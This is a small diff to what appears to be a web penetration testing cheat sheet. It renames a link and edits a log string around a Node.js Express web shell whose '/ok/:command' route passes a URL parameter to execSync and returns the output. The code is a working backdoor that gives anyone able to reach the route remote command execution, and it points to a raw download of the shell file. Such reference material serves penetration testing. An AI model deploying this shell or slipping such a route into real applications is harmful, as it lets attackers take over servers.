@@ -828,7 +828,7 @@ const express = require('express')
 const app = express();
 
 app.listen(3000, () => 
-	console.log('.ada..')
+	console.log('...')
 );
 function Exec(command){ 
 	const { execSync } = require("child_process");
@@ -839,7 +839,7 @@ app.get('/ok/:command', (req, res) =>
 res.send(Exec(req.params.command))
 );
 ```
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/ok.js
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/wshell.js
 
 ### SQL Injection Out-Of-Band, etc
 
